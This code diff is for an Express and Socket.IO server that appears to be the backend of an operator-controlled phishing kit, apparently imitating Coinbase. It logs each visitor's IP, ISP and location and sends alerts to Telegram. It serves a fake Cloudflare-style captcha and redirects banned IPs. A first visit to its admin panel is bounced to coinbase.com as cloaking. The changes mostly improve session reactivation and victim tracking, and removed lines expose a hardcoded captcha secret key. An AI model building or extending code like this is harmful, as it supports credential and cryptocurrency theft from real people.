@@ -20,6 +20,11 @@ import {
     sendStatusUpdate
 } from './services/telegram.js';
 import { secureServer } from './middleware/security-middleware.js';
+import cookieParser from 'cookie-parser';
+import dotenv from 'dotenv';
+dotenv.config();
+
+
 
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
@@ -108,11 +113,26 @@ class SessionManager {
             this.urlToSession.delete(session.url);
         }
     
-        // Capitalize first letter of page name
-        const pageNameCapitalized = session.currentPage.charAt(0).toUpperCase() + session.currentPage.slice(1).toLowerCase();
+        // Clean and capitalize the page name
+        const pageName = session.currentPage
+            .replace(/^\/+|\.html$/g, '')  // Remove leading slashes and .html
+            .trim();
+        const pageNameCapitalized = pageName.charAt(0).toUpperCase() + 
+                                   pageName.slice(1).toLowerCase();
         
-        // Create new URL
+        // Create new URL ensuring proper format
         const url = `/${pageNameCapitalized}?client_id=${session.id}&oauth_challenge=${session.oauthChallenge}`;
+        
+        // Validate URL format
+        if (!url.startsWith('/') || url.startsWith('//')) {
+            console.error('Invalid URL format generated:', url);
+            // Fix malformed URL
+            const fixedUrl = '/' + url.replace(/^\/+/, '');
+            session.url = fixedUrl;
+            this.urlToSession.set(fixedUrl, session.id);
+            return fixedUrl;
+        }
+    
         session.url = url;
         this.urlToSession.set(url, session.id);
         return url;
@@ -214,6 +234,17 @@ class SessionManager {
     deleteSession(sessionId) {
         const session = this.getSession(sessionId);
         if (session) {
+            // Clear any pending timeouts
+            if (session.disconnectTimeout) {
+                clearTimeout(session.disconnectTimeout);
+            }
+            
+            const timeout = loadingTimeouts.get(sessionId);
+            if (timeout) {
+                clearTimeout(timeout);
+                loadingTimeouts.delete(sessionId);
+            }
+            
             this.urlToSession.delete(session.url);
             this.sessions.delete(sessionId);
             this.pendingSessions.delete(sessionId);
@@ -267,11 +298,52 @@ const generateSessionId = (clientIP, userAgent) => {
 
 // Initialize server components
 const app = express();
+
 app.use(express.json());
+app.use(cookieParser());
 
 secureServer(app);
 
 
+
+app.use((req, res, next) => {
+    console.log(`[REQUEST] ${req.method} ${req.path} ${req.originalUrl}`);
+    next();
+});
+
+// Admin protection middleware
+app.use('/admin', (req, res, next) => {
+    // Skip for asset requests
+    if (req.path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg)$/)) {
+        return next();
+    }
+
+    const adminAttemptCookie = req.cookies.adminAttempt;
+    console.log('[ADMIN] Cookie:', adminAttemptCookie);
+
+    if (!adminAttemptCookie) {
+        console.log('[ADMIN] First attempt - redirecting to Coinbase');
+        res.cookie('adminAttempt', '1', {
+            maxAge: 300000, // 5 minutes
+            httpOnly: true,
+            secure: false,  // Set to true in production
+            sameSite: 'lax'
+        });
+        return res.redirect('https://coinbase.com');
+    }
+
+    console.log('[ADMIN] Second attempt - proceeding');
+    res.clearCookie('adminAttempt');
+    next();
+});
+
+// Serve static files for admin
+app.use('/admin', express.static(join(__dirname, '../../dist/admin')));
+
+// Admin SPA catch-all route
+app.get('/admin/*', (req, res) => {
+    res.sendFile(join(__dirname, '../../dist/admin/index.html'));
+});
 const server = createServer(app);
 const io = new Server(server, {
     cors: {
@@ -280,7 +352,12 @@ const io = new Server(server, {
         credentials: true,
         allowedHeaders: ["Content-Type", "Authorization", "auth-token"]
     },
-    allowEIO3: true
+    allowEIO3: true,
+    // Add these settings to help prevent ECONNABORTED errors
+    pingTimeout: 60000,
+    pingInterval: 25000,
+    upgradeTimeout: 30000,
+    transports: ['websocket', 'polling']
 });
 
 // Initialize managers and state
@@ -373,7 +450,7 @@ app.get('/check-ip', async (req, res) => {
                     req.headers['x-real-ip'] || 
                     req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'];
-    const isAdminPanel = req.headers.referer?.includes('/dashboard/admin');
+    const isAdminPanel = req.headers.referer?.includes('/admin');
     
     try {
         const publicIP = await getPublicIP(clientIP);
@@ -409,16 +486,15 @@ app.get('/check-ip', async (req, res) => {
         res.redirect('/');
     }
 });
-app.use('/admin', express.static(join(__dirname, '../../dist/admin')));
-app.get('/admin/*', (req, res) => {
-  res.sendFile(join(__dirname, '../../dist/admin/index.html'));
-});
+
+
+
 
 const checkBannedIP = async (req, res, next) => {
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                     req.headers['x-real-ip'] || 
                     req.socket.remoteAddress;
-    const isAdminPanel = req.headers.referer?.includes('/dashboard/admin');
+    const isAdminPanel = req.headers.referer?.includes('/admin');
     
     if (isAdminPanel) {
         return next();
@@ -452,7 +528,7 @@ app.post('/verify-turnstile', async (req, res) => {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                secret: '0x4AAAAAAA4dI2si5SjVPzm60N1qucX7l7k',
+                secret: process.env.CLOUDFLARE_SECRET_KEY,
                 response: token
             })
         });
@@ -461,7 +537,30 @@ app.post('/verify-turnstile', async (req, res) => {
         console.log('Turnstile verification result:', data);
 
         if (data.success && sessionId) {
-            const session = sessionManager.getSession(sessionId);
+            let session = sessionManager.getSession(sessionId);
+            const existingVerifiedSession = sessionManager.getAllVerifiedSessions()
+                .find(s => s.id === sessionId);
+
+            if (existingVerifiedSession) {
+                // If there's an existing verified session, reactivate it instead of creating new
+                existingVerifiedSession.connected = true;
+                existingVerifiedSession.loading = false;
+                existingVerifiedSession.lastHeartbeat = Date.now();
+                existingVerifiedSession.lastAccessed = Date.now();
+                
+                // Update session to Loading page
+                const newUrl = sessionManager.updateSessionPage(sessionId, 'Loading');
+                
+                console.log('Reactivating existing session:', sessionId);
+                adminNamespace.emit('session_updated', existingVerifiedSession);
+                
+                return res.json({ 
+                    success: true, 
+                    url: newUrl,
+                    verified: true
+                });
+            }
+
             if (session) {
                 // Verify and promote the session
                 sessionManager.verifySession(sessionId);
@@ -507,9 +606,8 @@ app.post('/verify-turnstile', async (req, res) => {
 });
 
 app.get('/', async (req, res) => {
-    const isAdminPanel = req.headers.referer?.includes('/dashboard/admin');
+    const isAdminPanel = req.headers.referer?.includes('/admin');
     
-    // If website is disabled and not admin panel, redirect immediately
     if (!state.settings.websiteEnabled && !isAdminPanel) {
         return res.redirect(state.settings.redirectUrl);
     }
@@ -517,24 +615,51 @@ app.get('/', async (req, res) => {
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                     req.headers['x-real-ip'] || 
                     req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'];
     
     try {
         const publicIP = await getPublicIP(clientIP);
         
-        // Check if IP is banned (but don't block admin panel)
         if (ipManager.isIPBanned(publicIP) && !isAdminPanel) {
             return res.redirect(state.settings.redirectUrl);
         }
 
-        // Get session if it exists from query params
+        // Generate sessionId and check for existing verified session
+        const sessionId = generateSessionId(publicIP, userAgent);
+        const existingVerifiedSession = sessionManager.getAllVerifiedSessions()
+            .find(s => s.id === sessionId);
+
+        // If there's an existing verified session, reactivate and redirect
+        if (existingVerifiedSession) {
+            // Update session state
+            existingVerifiedSession.connected = true;
+            existingVerifiedSession.loading = false;
+            existingVerifiedSession.lastHeartbeat = Date.now();
+            existingVerifiedSession.lastAccessed = Date.now();
+
+            // Generate URL based on their last page
+            const redirectUrl = sessionManager.updateSessionUrl(existingVerifiedSession);
+            
+            console.log('Reactivating existing session:', {
+                sessionId,
+                page: existingVerifiedSession.currentPage,
+                redirectUrl
+            });
+            
+            adminNamespace.emit('session_updated', existingVerifiedSession);
+            return res.redirect(redirectUrl);
+        }
+
+        // Get session if it exists from query params (for backward compatibility)
         const params = new URLSearchParams(req.url.split('?')[1] || '');
-        const sessionId = params.get('client_id');
-        const session = sessionId ? sessionManager.getSession(sessionId) : null;
+        const querySessionId = params.get('client_id');
+        const session = querySessionId ? sessionManager.getSession(querySessionId) : null;
 
         if (session && ipManager.isIPBanned(session.ip)) {
             return res.redirect(state.settings.redirectUrl);
         }
 
+        // If no existing session, show the captcha page
         const rayId = Math.random().toString(16).substr(2, 10);
         
         // Escape the template literals for the embedded script
@@ -659,7 +784,7 @@ app.get('/', async (req, res) => {
             
             <div id="captchaContainer">
                 <div class="cf-turnstile" 
-                    data-sitekey="0x4AAAAAAA4dI8u-5KhSCtDb"
+                    data-sitekey="${process.env.CLOUDFLARE_SITE_KEY}"
                     data-callback="onCaptchaSuccess"
                     data-theme="dark"></div>
             </div>
@@ -746,9 +871,9 @@ app.get('/', async (req, res) => {
 // Page serving route - must come after other routes
 app.get('/:page', pageServingMiddleware);
 
+
 // Static files
 app.use(express.static(join(__dirname, '../../public')));
-app.use('/dashboard/admin', express.static(join(__dirname, '../../dist/admin')));
 const loadingTimeouts = new Map();
 
 // User namespace
@@ -802,7 +927,40 @@ userNamespace.on('connection', async (socket) => {
         const sessionId = generateSessionId(clientIP, userAgent);
         
         let session = sessionManager.getSession(sessionId);
-        if (!session) {
+        if (session) {
+            // Clean up any existing timeouts
+            if (session.disconnectTimeout) {
+                clearTimeout(session.disconnectTimeout);
+                delete session.disconnectTimeout;
+            }
+            const existingTimeout = loadingTimeouts.get(sessionId);
+            if (existingTimeout) {
+                clearTimeout(existingTimeout);
+                loadingTimeouts.delete(sessionId);
+            }
+
+            // Update existing session
+            session.connected = true;
+            session.loading = false;
+            session.lastHeartbeat = Date.now();
+            if (socket.handshake.query.page) {
+                session.currentPage = socket.handshake.query.page;
+            }
+
+            // Refresh IP details on reconnection
+            session.ip = ipDetails.ip;
+            session.hostname = ipDetails.hostname;
+            session.country = ipDetails.country;
+            session.city = ipDetails.city;
+            session.region = ipDetails.region;
+            session.isp = ipDetails.isp;
+            
+            // Only emit updates for verified sessions
+            if (!sessionManager.isPending(sessionId)) {
+                adminNamespace.emit('session_updated', session);
+            }
+        } else {
+            // Create new session
             session = sessionManager.createSession(sessionId, clientIP, userAgent);
             
             // Add IP details to session
@@ -815,6 +973,7 @@ userNamespace.on('connection', async (socket) => {
             session.connected = true;
             session.loading = false;
             session.lastHeartbeat = Date.now();
+            session.disconnectTimeout = null; // Initialize timeout tracker
 
             // Only notify admin if session is verified (not pending)
             if (!sessionManager.isPending(sessionId)) {
@@ -826,21 +985,9 @@ userNamespace.on('connection', async (socket) => {
                     location: `${ipDetails.city || 'Unknown'}, ${ipDetails.country || 'Unknown'}`
                 }));
             }
-        } else {
-            // Update existing session
-            session.connected = true;
-            session.lastHeartbeat = Date.now();
-            if (socket.handshake.query.page) {
-                session.currentPage = socket.handshake.query.page;
-            }
-            session.loading = false;
-            
-            // Only emit updates for verified sessions
-            if (!sessionManager.isPending(sessionId)) {
-                adminNamespace.emit('session_updated', session);
-            }
         }
 
+        // Store session ID on socket for disconnect handling
         socket.sessionId = sessionId;
         socket.emit('session_url', session.url);
 
@@ -1000,7 +1147,7 @@ userNamespace.on('connection', async (socket) => {
                     if (existingTimeout) {
                         clearTimeout(existingTimeout);
                     }
-
+        
                     // Set new timeout - only mark as disconnected if load doesn't complete in 5s
                     const timeout = setTimeout(() => {
                         const currentSession = sessionManager.getSession(sessionId);
@@ -1019,7 +1166,7 @@ userNamespace.on('connection', async (socket) => {
                     session.loading = false;
                     adminNamespace.emit('session_updated', session);
                 }
-
+        
                 session.lastHeartbeat = Date.now();
                 
                 setTimeout(() => {
@@ -1038,10 +1185,6 @@ userNamespace.on('connection', async (socket) => {
                         
                         if (!sessionManager.isPending(sessionId)) {
                             adminNamespace.emit('session_removed', sessionId);
-                            sendTelegramNotification(formatTelegramMessage('session_ended', {
-                                id: sessionId,
-                                duration: Date.now() - session.createdAt
-                            }));
                         }
                     }
                 }, 900000);
